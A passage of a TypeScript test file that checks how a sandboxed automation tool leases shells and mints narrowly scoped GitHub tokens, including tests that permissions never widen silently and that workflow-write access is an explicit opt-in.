    const second = runGh(sandbox, gh("issue", "view", "2"), "repo-read", {
      mint,
    });
    await expect(first).rejects.toThrow(/boom/);
    expect((await second).stdout).toBe("ok");
    expect(steps.filter((step) => step.kind === "policy")).toHaveLength(4);
  });

  test("leases on different sandboxes do not wait for each other", async () => {
    const order: string[] = [];
    let release: () => void = () => undefined;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const { mint } = mintOk();
    const blocked = withShellLease(
      { name: "sbx_a", setNetworkPolicy: async () => undefined },
      { mint },
      async () => {
        await gate;
        order.push("a");
      }
    );
    await withShellLease(
      { name: "sbx_b", setNetworkPolicy: async () => undefined },
      { mint },
      async () => {
        order.push("b");
      }
    );
    expect(order).toEqual(["b"]);
    release();
    await blocked;
    expect(order).toEqual(["b", "a"]);
  });
});

describe("token scopes", () => {
  test("no scope except repo-push can write repository contents, and none can change workflows by default", () => {
    for (const scope of ["repo-read", "repo-triage", "repo-push"] as const) {
      const { optional, required } = permissionsFor(scope);
      const all = [...required, ...optional];
      expect(all).not.toContain("workflows:write");
      expect(all).not.toContain("administration:write");
      if (scope !== "repo-push") {
        expect(all).not.toContain("contents:write");
      }
    }
    expect(TOKEN_SCOPES["repo-triage"].required).toEqual([
      "contents:read",
      "issues:write",
      "pull_requests:write",
    ]);
    expect(
      TOKEN_SCOPES["repo-read"].required.every((entry) =>
        entry.endsWith(":read")
      )
    ).toBe(true);
  });

  test("workflow changes are an explicit opt-in on the push scope only", () => {
    vi.stubEnv("FACTORY_ALLOW_WORKFLOW_CHANGES", "1");
    expect(permissionsFor("repo-push")).toEqual({
      optional: ["workflows:write"],
      required: ["contents:write"],
    });
    expect(permissionsFor("repo-read")).toBe(TOKEN_SCOPES["repo-read"]);
    expect(permissionsFor("repo-triage")).toBe(TOKEN_SCOPES["repo-triage"]);
  });

  test("the widest set the installation grants is requested first, and remembered", async () => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      return TOKEN;
    };
    await mintScopedToken("repo-triage", { mint });
    await mintScopedToken("repo-triage", { mint });
    const full = [
      ...TOKEN_SCOPES["repo-triage"].required,
      ...TOKEN_SCOPES["repo-triage"].optional,
    ];
    expect(requests).toEqual([full, full]);
  });

  test("an installation without the optional permissions gets the required set", async () => {
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (permissions?.includes("checks:read")) {
        throw new Error("422: permissions not granted to this installation");
      }
      return TOKEN;
    };
    expect(await mintScopedToken("repo-read", { mint })).toBe(TOKEN);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
    await mintScopedToken("repo-read", { mint });
    expect(requests).toHaveLength(3);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
  });

  test("by default a scope never widens: when narrowing is refused the command fails, whatever the error", async () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let installationCalls = 0;
    for (const failure of [
      "422: permissions not granted",
      "ETIMEDOUT",
      "500 Internal Server Error",
    ]) {
      resetTokenScopeMemo();
      const requests: (readonly string[] | null)[] = [];
      await expect(
        mintScopedToken("repo-read", {
          installationToken: async () => {
            installationCalls += 1;
            return "FULL-INSTALLATION-TOKEN";
          },
          mint: async (permissions) => {
            requests.push(permissions);
            throw new Error(failure);
          },
        })
      ).rejects.toThrow(/Could not mint a GitHub token for scope "repo-read"/);
      expect(requests).toHaveLength(2);
      expect(requests).not.toContain(null);
    }
    expect(installationCalls).toBe(0);
    expect(warn).not.toHaveBeenCalled();
  });

  test("a strict mint never takes a wider rung, whatever the setting, and its failure is a NarrowTokenError", async () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    for (const setting of ["", "repository", "installation"]) {
      for (const scope of ["repo-read", "repo-triage", "repo-push"] as const) {
        resetTokenScopeMemo();
        vi.stubEnv("FACTORY_TOKEN_FALLBACK", setting);
        const requests: (readonly string[] | null)[] = [];
        let installationCalls = 0;
        await expect(
          mintScopedToken(
            scope,
            {
              installationToken: async () => {
                installationCalls += 1;
                return "FULL-INSTALLATION-TOKEN";
              },
              mint: async (permissions) => {
                requests.push(permissions);
                if (permissions !== null) {
                  throw new Error("422: cannot narrow");
                }
                return "WIDE-REPOSITORY-TOKEN";
              },
            },
            { strict: true }
          )
        ).rejects.toBeInstanceOf(NarrowTokenError);
        expect(requests).not.toContain(null);
        expect(requests.length).toBeGreaterThan(0);
        expect(installationCalls).toBe(0);
      }
    }
    expect(warn).not.toHaveBeenCalled();
  });

  test("a strict mint takes a narrow token like any other", async () => {
    const { mint, requests } = mintOk();
    expect(await mintScopedToken("repo-read", { mint }, { strict: true })).toBe(
      TOKEN
    );
    expect(requests).toEqual([READ_PERMISSIONS]);
  });

  test("the failure names the permissions to check and the setting that would allow a wider token", async () => {
    await expect(
      mintScopedToken("repo-triage", {
        mint: async () => {
          throw new Error("refused");
        },
      })
    ).rejects.toThrow(
      /contents:read, issues:write, pull_requests:write.*FACTORY_TOKEN_FALLBACK=repository/s
    );
  });

  test("FACTORY_TOKEN_FALLBACK=repository allows the app's permissions on the factory repository, and says so", async () => {
    vi.stubEnv("FACTORY_TOKEN_FALLBACK", "repository");
    const warn = vi.spyOn(console, "warn").mockImplementation(() => undefined);
    let installationCalls = 0;
    const requests: (readonly string[] | null)[] = [];
    const token = await mintScopedToken("repo-triage", {
      installationToken: async () => {
        installationCalls += 1;
        return "FULL";
      },
      mint: async (permissions) => {
        requests.push(permissions);
        if (permissions !== null) {
          throw new Error("unsupported");
        }
        return TOKEN;
      },
    });
    expect(token).toBe(TOKEN);
    expect(requests.at(-1)).toBeNull();
    expect(installationCalls).toBe(0);
    expect(warn).toHaveBeenCalledTimes(1);
    expect(String(warn.mock.calls[0]?.[0])).toMatch(/could not be narrowed/);
  });

  test("an empty token is treated as a failure, not as a credential", async () => {
    await expect(
      mintScopedToken("repo-read", { mint: async () => "" })
    ).rejects.toThrow(/Could not mint a GitHub token/);
  });

  test("a remembered rung that stops working is forgotten, and the ladder is walked again", async () => {
    const installation: { grantsChecks: boolean } = { grantsChecks: true };
    const requests: (readonly string[] | null)[] = [];
    const mint: TokenMinter = async (permissions) => {
      requests.push(permissions);
      if (!installation.grantsChecks && permissions?.includes("checks:read")) {
        throw new Error("422: permission removed");
      }
      return TOKEN;
    };
    await mintScopedToken("repo-read", { mint });
    installation.grantsChecks = false;
    expect(await mintScopedToken("repo-read", { mint })).toBe(TOKEN);
    expect(requests.at(-1)).toEqual(TOKEN_SCOPES["repo-read"].required);
  });
});
